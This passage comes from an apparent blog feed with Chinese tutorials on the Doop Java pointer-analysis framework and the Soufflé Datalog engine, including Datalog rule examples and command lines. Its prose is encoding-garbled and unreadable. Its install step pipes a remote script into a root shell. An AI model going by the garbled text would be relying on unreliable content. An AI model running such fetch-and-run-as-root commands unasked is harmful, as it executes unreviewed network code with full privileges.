id="æŸ¥æ‰¾å…³ç³»"><a href="#æŸ¥æ‰¾å…³ç³»" class="headerlink" title="æŸ¥æ‰¾å…³ç³»"></a>æŸ¥æ‰¾å…³ç³»</h2><p>å£°æ˜äº†ä¸€ä¸ªåä¸º <code>IsSerializable</code> çš„å…³ç³»ï¼Œå®šä¹‰ä¸º <code>java.io.Serializable</code> çš„å­ç±»ï¼Œè¾“å‡ºç»“æœå°†ä¼šæ˜¯å¯åºåˆ—åŒ–ç±»ã€‚</p><ul><li><code>basic.SubtypeOf</code> è¡¨ç¤º basic å‘½åç©ºé—´ï¼ˆç»„ä»¶ï¼‰ä¸‹çš„ SubtypeOf å…³ç³»ï¼ŒåŒ…å«ç±»ä¹‹é—´çš„ç»§æ‰¿å…³ç³»</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">IsSerializable</span>(?class:<span class="symbol">Type</span>)</span><br><span class="line"></span><br><span class="line"><span class="symbol">IsSerializable</span>(?subtype) :-</span><br><span class="line">  basic.<span class="symbol">SubtypeOf</span>(?subtype, ?type),</span><br><span class="line">  ?type = <span class="string">&quot;java.io.Serializable&quot;</span>.</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">IsSerializable</span></span><br></pre></td></tr></table></figure><p>ä¿å­˜åˆ° myrules.dl ä¸­ï¼Œæ‰§è¡ŒåŒæ ·çš„åˆ†æã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è€—æ—¶ 5m59s</span></span><br><span class="line">./doop -i test.jar -a context-insensitive --stats none --generate-jimple --fact-gen-cores 32 --souffle-jobs 32 --open-programs concrete-types --extra-logic myrules.dl --id ser</span><br></pre></td></tr></table></figure><p>èƒ½å¤Ÿå¾—åˆ°é¢„æœŸçš„ç»“æœï¼š</p><p><img src="https://s2.loli.net/2021/12/17/8wLlpkeA1FMhdQq.jpg"></p><h1 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h1><p>æ‹–äº†ä¸€ä¸ªæœˆç»ˆäºå†™äº†ç‚¹ä¸œè¥¿ï¼ˆæ‘Šæ‰‹ï¼‰ï¼Œå®é™…ä¸Šå¯¹ Doop è§„åˆ™çš„ç†è§£éƒ½é é˜…è¯» doop/souffle-logic ä¸­çš„ datalog ä»¥åŠåœ¨ Discord é¢‘é“é‡Œè¿›è¡Œæé—®ï¼Œè‡³å°‘ç°åœ¨èƒ½å¤Ÿçœ‹æ‡‚å¤§éƒ¨åˆ†è§„åˆ™ï¼Œä¹Ÿèƒ½å¤Ÿæ ¹æ®éœ€æ±‚å†™ä¸€å†™ç®€å•çš„è§„åˆ™äº†ã€‚</p><p>åˆ†ææ¯”è¾ƒè€—æ—¶å’Œä¸ç›´è§‚ï¼Œè¯´æ˜¯æœ€å…ˆè¿›çš„æŒ‡é’ˆåˆ†æå·¥å…·ï¼Œä½†ä¸Šæ‰‹å®åœ¨æ˜¯éš¾ï¼ŒæŠ½ç©ºç»§ç»­ç¢ç£¨ç¢ç£¨ï¼Œå¾—å»å­¦ Soot æ‰“å·¥äº†ã€‚<br><em>PSï¼šæ€ä¹ˆæœ‰äºº Java ç¨‹åºè¿˜ä¸å’‹ä¼šå†™å°±æ¥åšåˆ†æçš„å•Š</em></p><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><p>åŸºæœ¬å°±æ˜¯æ ¹æ®å·¥å…·æœ¬èº«å’Œç›¸å…³è®ºæ–‡æ‘¸ç´¢å‡ºæ¥çš„ã€‚</p><ul><li><a href="https://bitbucket.org/yanniss/doop/src/master/">Yannis Smaragdakis/Untitled project/doop</a></li><li><a href="https://bitbucket.org/yanniss/doop/src/master/docs/doop-101.md">Doop 101</a></li><li><a href="https://github.com/souffle-lang/souffle">souffle-lang/souffle</a></li><li><a href="https://souffle-lang.github.io/">SoufflÃ© | SoufflÃ© â€¢ A Datalog Synthesis Tool for Static Analysis</a></li><li><a href="http://plast-lab.github.io/">PLaST research group</a></li><li><a href="https://discord.gg/4q7rj5s">Doop Discord Channel</a></li></ul>]]></content>
    
    
    <summary type="html">ç®€æ˜“ä½¿ç”¨è¯´æ˜ + è‡ªå®šä¹‰ Datalog æ‰©å±•è§„åˆ™</summary>
    
    
    
    <category term="Security" scheme="https://jckling.github.io/categories/Security/"/>
    
    
    <category term="Datalog" scheme="https://jckling.github.io/tags/Datalog/"/>
    
    <category term="Java" scheme="https://jckling.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Datalog å¼•æ“ SoufflÃ© æŒ‡å—</title>
    <link href="https://jckling.github.io/2021/11/22/Other/Datalog%20%E5%BC%95%E6%93%8E%20Souffl%C3%A9%20%E6%8C%87%E5%8D%97/"/>
    <id>https://jckling.github.io/2021/11/22/Other/Datalog%20%E5%BC%95%E6%93%8E%20Souffl%C3%A9%20%E6%8C%87%E5%8D%97/</id>
    <published>2021-11-22T11:01:43.000Z</published>
    <updated>2021-12-11T09:27:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‰æ®µæ—¶é—´çœ‹ Doop é¡ºæ‰‹æ•´ç†äº†ç¯‡ <a href="https://jckling.github.io/2021/10/26/Other/LogiQL%20%E5%85%A5%E9%97%A8/">LogiQL å…¥é—¨</a>ï¼Œç°åœ¨æ•´ç†ä¸€ä¸‹ SoufflÃ© çš„ä½¿ç”¨è®°å½•ã€‚SoufflÃ© æ˜¯ä¸€æ¬¾å¼€æºçš„ Datalog å¼•æ“ï¼Œç›¸å¯¹ LogixBlox æ›´æ–°æ›´å¿«ï¼ˆè‡³å°‘æœ‰è®ºæ–‡è¿™ä¹ˆæ€»ç»“ï¼‰ï¼Œè€Œ Doop é»˜è®¤ä½¿ç”¨å’Œç»´æŠ¤äº†ä¸€æ•´å¥— SoufflÃ© çš„è§„åˆ™ã€‚å› ä¸ºæ˜¯å¼€æºå¼•æ“ï¼Œæ‰€ä»¥æœ‰ç›¸å…³å·¥ä½œç›´æ¥å¯¹ Doop å’Œ SoufflÃ© è¿›è¡Œä¿®æ”¹ï¼Œç”¨äºå®ç°ä¸€äº›åˆ†æï¼Œç„¶åå‘äº†é¡¶ä¼šğŸ˜‡ğŸ˜‡ğŸ˜‡</p><p>ç›¸å…³èµ„æ–™çœŸçš„æ˜¯å°‘ï¼Œä¸ç„¶å°±æ˜¯éš¾è¯»ï¼Œåæ­£èŠ±æ—¶é—´çœ‹å‘—ï¼ˆæ‘Šæ‰‹ï¼‰ï¼Œæœ€ç»ˆç›®çš„æ˜¯çœ‹æ‡‚ Doop ä¸­çš„è§„åˆ™ã€‚</p><h1 id="å®‰è£…-Souffle"><a href="#å®‰è£…-Souffle" class="headerlink" title="å®‰è£… SoufflÃ©"></a>å®‰è£… SoufflÃ©</h1><p>å®éªŒä½¿ç”¨ Ubuntu 20.04 è¿›è¡Œï¼Œsouffleã€doopï¼ˆjava8ï¼‰éƒ½å¯ä»¥æˆåŠŸå®‰è£…å’Œä½¿ç”¨ã€‚</p><p>SoufflÃ© æœ‰ä¸€ä¸ªè§£é‡Šå™¨å’Œä¸€ä¸ªç¼–è¯‘å™¨æ¥æ‰§è¡Œ Datalog ç¨‹åºï¼Œé€šè¿‡è„šæœ¬å®‰è£…ã€‚<em>PSï¼šä¸‡ä¸€æ— æ³•ä¸‹è½½ï¼Œå¯èƒ½æ˜¯æœåŠ¡å™¨é—®é¢˜ï¼ˆä¹‹å‰ä¹Ÿå®•æœºè¿‡ï¼‰</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸‹è½½</span></span><br><span class="line">curl -s https://packagecloud.io/install/repositories/souffle-lang/souffle/script.deb.sh | sudo bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…</span></span><br><span class="line">sudo apt install souffle -y</span><br></pre></td></tr></table></figure><h1 id="ä½¿ç”¨-Souffle"><a href="#ä½¿ç”¨-Souffle" class="headerlink" title="ä½¿ç”¨ SoufflÃ©"></a>ä½¿ç”¨ SoufflÃ©</h1><h2 id="ä¸€ä¸ªç®€å•çš„ä¾‹å­"><a href="#ä¸€ä¸ªç®€å•çš„ä¾‹å­" class="headerlink" title="ä¸€ä¸ªç®€å•çš„ä¾‹å­"></a>ä¸€ä¸ªç®€å•çš„ä¾‹å­</h2><p>example.dl å®šä¹‰â€œè¾¹â€å’Œâ€œè·¯å¾„â€</p><ul><li><code>edge</code> æ˜¯ä¸€ä¸ª <code>.input</code> å…³ç³»ï¼Œå°†ä»ç£ç›˜è¯»å–</li><li><code>path</code> æ˜¯ä¸€ä¸ª <code>.output</code> å…³ç³»ï¼Œå°†è¢«å†™å…¥ç£ç›˜</li><li>å¦‚æœæœ‰ä¸€æ¡ä» x åˆ° y çš„è¾¹ï¼Œé‚£ä¹ˆå°±æœ‰ä¸€æ¡ä» x åˆ° y çš„è·¯å¾„</li><li>å¦‚æœæœ‰ä¸€æ¡ä» x åˆ° z çš„è·¯å¾„ï¼Œå¹¶ä¸”ä» z åˆ° y æœ‰ä¸€æ¡è¾¹ï¼Œé‚£ä¹ˆå°±æœ‰ä¸€æ¡ä» x åˆ° y çš„è·¯å¾„</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.decl edge(x:number, y:number)  // å£°æ˜</span><br><span class="line">.input edge     // æ²¡æœ‰æŒ‡å®šæ–‡ä»¶ï¼Œé»˜è®¤ä» edge.facts ä¸­è¯»å–</span><br><span class="line"></span><br><span class="line">.decl path(x:number, y:number)  // å£°æ˜</span><br><span class="line">.output path    // è¾“å‡ºä¸º path.csv</span><br><span class="line"></span><br><span class="line">// å®šä¹‰ï¼Œæ³¨æ„æœ«å°¾çš„ . ç¬¦å·</span><br><span class="line">path(x, y) :- edge(x, y).</span><br><span class="line">path(x, y) :- path(x, z), edge(z, y).</span><br></pre></td></tr></table></figure><p>å¦‚æœè¾“å…¥çš„ <code>edge</code> å…³ç³»æ˜¯å›¾ä¸­çš„é¡¶ç‚¹å¯¹ï¼Œæ ¹æ®ä¸Šé¢çš„ä¸¤ä¸ªè§„åˆ™ï¼Œè¾“å‡ºçš„è·¯å¾„å…³ç³»å°†æä¾›æ‰€æœ‰é¡¶ç‚¹å¯¹ x å’Œ yï¼Œå³å›¾ä¸­å­˜åœ¨ x åˆ° y çš„è·¯å¾„ã€‚</p><p>è¾“å…¥æ–‡ä»¶ edge.factsï¼Œä½¿ç”¨åˆ¶è¡¨ç¬¦åˆ†éš”ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 2</span><br><span class="line">2 3</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œåˆ†æï¼Œ<code>-F</code> è¡¨ç¤ºè¾“å…¥æ–‡ä»¶è·¯å¾„ï¼Œ<code>-D</code> è¡¨ç¤ºè¾“å‡ºæ–‡ä»¶è·¯å¾„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">souffle -F. -D. example.dl</span><br><span class="line"><span class="comment"># souffle -F./input -D./output example.dl</span></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹è¾“å‡ºæ–‡ä»¶ path.csvï¼ŒåŒ…å«æ‰€æœ‰å­˜åœ¨è·¯å¾„çš„é¡¶ç‚¹å¯¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">12</span><br><span class="line">23</span><br><span class="line">13</span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿è¡Œçš„æ˜¯ <strong>è§£é‡Šå™¨æ¨¡å¼</strong>ï¼ŒSoufflÃ© è¿˜æ”¯æŒ <strong>ç¼–è¯‘å™¨æ¨¡å¼</strong>ï¼Œå°† Datalog ç¨‹åºè½¬æ¢ä¸º C++ ç¨‹åºï¼Œç„¶åç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä½¿ç”¨ <code>-o</code> å‚æ•°ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</span></span><br><span class="line">souffle -F. -D. -oexample example.dl</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰§è¡Œåˆ†æ</span></span><br><span class="line">./example -F. -D. example.dl</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/22/BIYwt49Tdufm8gU.png"></p><p><code>-r</code> å‚æ•°ç”¨äºè°ƒè¯•ï¼Œç”Ÿæˆ HTML æ ¼å¼çš„è°ƒè¯•æŠ¥å‘Š <a href="https://github.com/jckling/Assets/blob/master/others/example.html">example.html</a>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souffle -F. -D. -rexample.html example.dl</span><br></pre></td></tr></table></figure><p><code>-p</code> å‚æ•°ç”¨äºåˆ†æï¼Œä»¥ä¸‹å‘½ä»¤å°†åˆ›å»ºä¸€ä¸ªåŒ…å«åˆ†æä¿¡æ¯çš„æ—¥å¿—æ–‡ä»¶ <a href="https://github.com/jckling/Assets/blob/master/others/example.log">example.log</a>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souffle -F. -D. -pexample.log example.dl</span><br></pre></td></tr></table></figure><p>souffle è¿˜æä¾›äº†ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…· <code>souffleprof</code>ï¼Œå¯ç”¨äºåˆ†æ example.logï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souffleprof example.log</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/22/k5K69OytM8igDXB.jpg"></p><h2 id="ä¾‹1"><a href="#ä¾‹1" class="headerlink" title="ä¾‹1"></a>ä¾‹1</h2><p>Datalog æ˜¯ä¸€ç§ï¼ˆå£°æ˜å¼ï¼‰åŸºäºé€»è¾‘çš„æŸ¥è¯¢è¯­è¨€ï¼Œå…è®¸ç”¨æˆ·æ‰§è¡Œé€’å½’æŸ¥è¯¢ã€‚Datalog è¯­æ³•çš„è§„èŒƒæ²¡æœ‰ç»Ÿä¸€çš„æ ‡å‡†ï¼Œé€šå¸¸é‡‡ç”¨ Prolog é£æ ¼çš„è¯­æ³•ã€‚SoufflÃ© çš„è¯­æ³•å—åˆ° Datalog å®ç°çš„å¯å‘ï¼Œå³ Z3 ä¸­çš„ bddbddb(BDD-Based Deductive DataBase) å’Œ muZã€‚</p><p>SoufflÃ© ä¸ºå¤§è§„æ¨¡é¢å‘é€»è¾‘çš„ç¼–ç¨‹æä¾›äº†è½¯ä»¶å·¥ç¨‹åŠŸèƒ½ï¼ˆä¾‹å¦‚ç»„ä»¶ï¼‰ï¼Œå¯¹äºå®é™…ä½¿ç”¨ï¼ŒSoufflÃ© é€šè¿‡ç®—æœ¯å‡½å­ï¼ˆarithmetic functorsï¼‰æ‰©å±•äº† Datalog ä½¿å…¶å›¾çµç­‰ä»·ï¼Œè®©ç¨‹åºå‘˜èƒ½å¤Ÿç¼–å†™éç»ˆæ­¢çš„ç¨‹åºã€‚</p><ul><li>éç»ˆæ­¢çš„ä¸€ä¸ªä¾‹å­æ˜¯äº‹å® A(0) å’Œè§„åˆ™ A(i + 1) :- A(i)ï¼Œæ²¡æœ‰é¢å¤–çš„çº¦æŸ</li><li>è¿™å¯¼è‡´ SoufflÃ© å°è¯•è¾“å‡ºæ— é™æ•°é‡çš„å…³ç³» A(n)ï¼Œå…¶ä¸­ n &gt;= 0</li><li>è¿™åœ¨æŸç§ç¨‹åº¦ä¸Šç±»ä¼¼äº C ç­‰å‘½ä»¤å¼ç¼–ç¨‹è¯­è¨€ä¸­çš„æ— é™ while å¾ªç¯ã€‚ä½†æ˜¯ï¼Œç®—æœ¯å‡½å­æä¾›çš„è¡¨è¾¾èƒ½åŠ›å¢å¼ºéå¸¸æ–¹ä¾¿ç¼–ç¨‹ã€‚</li></ul><h3 id="ä¼ é€’é—­åŒ…"><a href="#ä¼ é€’é—­åŒ…" class="headerlink" title="ä¼ é€’é—­åŒ…"></a>ä¼ é€’é—­åŒ…</h3><p>é›†åˆ X ä¸Šçš„å…³ç³» R æ˜¯å¯ä¼ é€’çš„ï¼Œå¦‚æœå¯¹äº X ä¸­çš„æ‰€æœ‰ xã€yã€zï¼Œå½“ <code>x R y</code> ä¸” <code>y R z</code> åˆ™ <code>x R z</code>ã€‚ä¸‹é¢çš„ç¤ºä¾‹è¡¨ç¤ºæœ‰å‘å›¾ï¼Œå…¶ä¸­è¾¹å®šä¹‰å…³ç³»ï¼Œå¦‚æœå…ƒç»„æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªè§„åˆ™ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œåˆ™å…ƒç»„å¤„äºä¼ é€’é—­åŒ…ï¼ˆå¯è¾¾å…³ç³»ï¼‰ä¸­ã€‚</p><ul><li>å®é™…ä¸Šï¼Œedge ä¸­çš„æ‰€æœ‰å…ƒç´ éƒ½æ˜¯å¯è¾¾çš„ï¼ˆæ ¹æ®åŸºæœ¬è§„åˆ™ï¼‰ï¼Œå½’çº³è§„åˆ™æ•è·äº†ä¼ é€’å±æ€§ï¼ŒåŒ…æ‹¬åƒ <code>reachable(&quot;a&quot;, &quot;d&quot;)</code> è¿™æ ·çš„å…ƒç»„ã€‚</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.decl edge(n: symbol, m: symbol)</span><br><span class="line">edge(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>). <span class="comment">/* facts of edge */</span></span><br><span class="line">edge(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>).</span><br><span class="line">edge(<span class="string">&quot;c&quot;</span>, <span class="string">&quot;b&quot;</span>).</span><br><span class="line">edge(<span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>).</span><br><span class="line"></span><br><span class="line">.decl reachable (n: symbol, m: symbol)</span><br><span class="line"></span><br><span class="line">.output reachable // output relation reachable</span><br><span class="line"></span><br><span class="line">reachable(x, y):- edge(x, y). // base rule</span><br><span class="line">reachable(x, z):- edge(x, y), reachable(y, z). // inductive rule</span><br></pre></td></tr></table></figure><h3 id="åŒä»£"><a href="#åŒä»£" class="headerlink" title="åŒä»£"></a>åŒä»£</h3><p>ç»™å®šä¸€æ£µæ ‘ï¼ˆå…·æœ‰ç‰¹å®šæ ¹èŠ‚ç‚¹çš„æœ‰å‘æ— ç¯å›¾ï¼‰ï¼Œç›®æ ‡æ˜¯æ‰¾åˆ°å“ªäº›èŠ‚ç‚¹å¤„äºåŒä¸€çº§åˆ«ã€‚</p><ul><li>ä¸‹å›¾ä¸­èŠ‚ç‚¹ b å’Œ c å¤„äºåŒä¸€çº§åˆ«ï¼ŒèŠ‚ç‚¹ e å’Œ g ä¹Ÿå¤„äºåŒä¸€çº§åˆ«ã€‚</li></ul><p><img src="https://souffle-lang.github.io/img/same_generation_graph.jpg"></p><p>å®šä¹‰ Parent å…³ç³»ï¼Œç„¶åæè¿°è¿™æ£µæ ‘ï¼›å®šä¹‰ Person å…³ç³»å’Œ SameGeneration å…³ç³»</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">Parent</span>(n: symbol, m: symbol)  // å­ä»£ï¼Œçˆ¶ä»£</span><br><span class="line"><span class="symbol">Parent</span>(<span class="string">&quot;d&quot;</span>, <span class="string">&quot;b&quot;</span>). <span class="symbol">Parent</span>(<span class="string">&quot;e&quot;</span>, <span class="string">&quot;b&quot;</span>). <span class="symbol">Parent</span>(<span class="string">&quot;f&quot;</span>,<span class="string">&quot;c&quot;</span>).</span><br><span class="line"><span class="symbol">Parent</span>(<span class="string">&quot;g&quot;</span>, <span class="string">&quot;c&quot;</span>). <span class="symbol">Parent</span>(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;a&quot;</span>). <span class="symbol">Parent</span>(<span class="string">&quot;c&quot;</span>,<span class="string">&quot;a&quot;</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Person</span>(n: symbol)</span><br><span class="line"><span class="symbol">Person</span>(x) :- <span class="symbol">Parent</span>(x, <span class="symbol">_</span>).  // å­ä»£</span><br><span class="line"><span class="symbol">Person</span>(x) :- <span class="symbol">Parent</span>(<span class="symbol">_</span>, x).  // çˆ¶ä»£</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">SameGeneration</span> (n: symbol, m: symbol)</span><br><span class="line"><span class="symbol">SameGeneration</span>(x, x):- <span class="symbol">Person</span>(x).   // è‡ªå·±å’Œè‡ªå·±æ˜¯åŒä»£</span><br><span class="line"><span class="symbol">SameGeneration</span>(x, y):- <span class="symbol">Parent</span>(x,p), <span class="symbol">SameGeneration</span>(p,q), <span class="symbol">Parent</span>(y,q).   // çˆ¶ä»£ç›¸ç­‰æ—¶ï¼Œå­ä»£æ˜¯åŒä»£</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">SameGeneration</span></span><br></pre></td></tr></table></figure><h3 id="æ•°æ®æµåˆ†æ"><a href="#æ•°æ®æµåˆ†æ" class="headerlink" title="æ•°æ®æµåˆ†æ"></a>æ•°æ®æµåˆ†æ</h3><p>æ•°æ®æµåˆ†æï¼ˆData-flow analysis, DFAï¼‰æ—¨åœ¨ç¡®å®šç¨‹åºçš„é™æ€å±æ€§ï¼ŒåŸºäºæ§åˆ¶æµå›¾ï¼ˆCall Flow Graphs, CFGï¼‰ï¼Œæ ¹æ®èŠ‚ç‚¹å’Œå›¾çš„å±æ€§è¿›è¡Œç¨‹åºåˆ†æã€‚</p><p>ä¸€ä¸ªä¾‹å­æ˜¯å¯è¾¾æ€§å®šä¹‰ï¼ˆreaching definitionï¼‰ï¼šå˜é‡çš„å®šä¹‰æ˜¯å¦åˆ°è¾¾ç¨‹åºä¸­ç‰¹å®šçš„ç‚¹ã€‚å› ä¸ºå˜é‡çš„èµ‹å€¼å¯ä»¥ç›´æ¥å½±å“ç¨‹åºä¸­å¦ä¸€ç‚¹çš„å€¼ï¼Œè¿™é‡Œè€ƒè™‘å˜é‡ v çš„æ˜ç¡®å®šä¹‰ dï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d: v &#x3D; &lt;expression&gt;;</span><br></pre></td></tr></table></figure><p>å¦‚æœä» d åˆ° u çš„æ‰€æœ‰è·¯å¾„éƒ½ä¸åŒ…å« v çš„ä»»ä½•æ˜ç¡®å®šä¹‰ï¼Œåˆ™å˜é‡ v çš„å®šä¹‰ d è¢«è®¤ä¸ºå¯åˆ°è¾¾è¯­å¥ uã€‚æ³¨æ„å³ä½¿æ²¡æœ‰æ˜ç¡®çš„å®šä¹‰ï¼Œå‡½æ•°ä¹Ÿå¯èƒ½å¯¹å˜é‡äº§ç”Ÿå‰¯ä½œç”¨ã€‚</p><p>è€ƒè™‘ä»¥ä¸‹æ§åˆ¶æµå›¾ï¼ŒåŒ…å«å˜é‡ v çš„æ˜ç¡®å®šä¹‰ d1 å’Œ d2ï¼Œåªæœ‰ d2 å®šä¹‰çš„ v èƒ½è¾¾åˆ° B3ã€‚</p><p><img src="https://souffle-lang.github.io/img/reaching_definition.jpg"></p><p>ä»¥ä¸‹ä»£ç è¾“å‡º CFG çš„æ‰€æœ‰é˜¶æ®µï¼Œå…¶ä¸­ v å¯èƒ½è¢«è¿™äº›å®šä¹‰ä¹‹ä¸€æ•è·ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// define control flow graph</span><br><span class="line">// via the <span class="symbol">Edge</span> relation</span><br><span class="line">.decl <span class="symbol">Edge</span>(n: symbol, m: symbol)    // è¾¹ n -&gt; m</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;start&quot;</span>, <span class="string">&quot;b1&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b1&quot;</span>, <span class="string">&quot;b2&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b1&quot;</span>, <span class="string">&quot;b3&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b2&quot;</span>, <span class="string">&quot;b4&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b3&quot;</span>, <span class="string">&quot;b4&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b4&quot;</span>, <span class="string">&quot;b1&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b4&quot;</span>, <span class="string">&quot;end&quot;</span>).</span><br><span class="line"></span><br><span class="line">// <span class="symbol">Generating</span> <span class="symbol">Definitions</span></span><br><span class="line">.decl <span class="symbol">GenDef</span>(n: symbol, d:symbol)   // ç”Ÿæˆå®šä¹‰ n -&gt; d</span><br><span class="line"><span class="symbol">GenDef</span>(<span class="string">&quot;b2&quot;</span>, <span class="string">&quot;d1&quot;</span>).</span><br><span class="line"><span class="symbol">GenDef</span>(<span class="string">&quot;b4&quot;</span>, <span class="string">&quot;d2&quot;</span>).</span><br><span class="line"></span><br><span class="line">// <span class="symbol">Killing</span> <span class="symbol">Definitions</span></span><br><span class="line">.decl <span class="symbol">KillDef</span>(n: symbol, d:symbol)  // é”€æ¯å®šä¹‰ n -&gt; d</span><br><span class="line"><span class="symbol">KillDef</span>(<span class="string">&quot;b4&quot;</span>, <span class="string">&quot;d1&quot;</span>).</span><br><span class="line"><span class="symbol">KillDef</span>(<span class="string">&quot;b2&quot;</span>, <span class="string">&quot;d2&quot;</span>).</span><br><span class="line"></span><br><span class="line">// <span class="symbol">Reachable</span></span><br><span class="line">.decl <span class="symbol">Reachable</span>(n: symbol, d:symbol)    // å¯è¾¾å®šä¹‰</span><br><span class="line"><span class="symbol">Reachable</span>(u,d) :- <span class="symbol">GenDef</span>(u,d).  //ç”Ÿæˆç‚¹å¿…å®šå¯è¾¾</span><br><span class="line"><span class="symbol">Reachable</span>(v,d) :- <span class="symbol">Edge</span>(u,v), <span class="symbol">Reachable</span>(u,d), !<span class="symbol">KillDef</span>(u,d). // è¾¹uvï¼Œu ç‚¹å¯è¾¾ä¸”æ²¡æœ‰é”€æ¯å®šä¹‰ dï¼Œåˆ™ d å¯è¾¾ v</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">Reachable</span></span><br></pre></td></tr></table></figure><h3 id="å…³äºè¾“å…¥å’Œ-C-é¢„å¤„ç†å™¨çš„å¤‡æ³¨"><a href="#å…³äºè¾“å…¥å’Œ-C-é¢„å¤„ç†å™¨çš„å¤‡æ³¨" class="headerlink" title="å…³äºè¾“å…¥å’Œ C é¢„å¤„ç†å™¨çš„å¤‡æ³¨"></a>å…³äºè¾“å…¥å’Œ C é¢„å¤„ç†å™¨çš„å¤‡æ³¨</h3><p>ä¸ C++ ä¸€æ ·ï¼ŒSoufflÃ© ä½¿ç”¨ä¸¤ç§ç±»å‹çš„æ³¨é‡Šï¼š</p><ul><li>ç±»å‹ 1ï¼š<code>// è¿™æ˜¯å¤‡æ³¨</code></li><li>ç±»å‹ 2ï¼š<code>/* 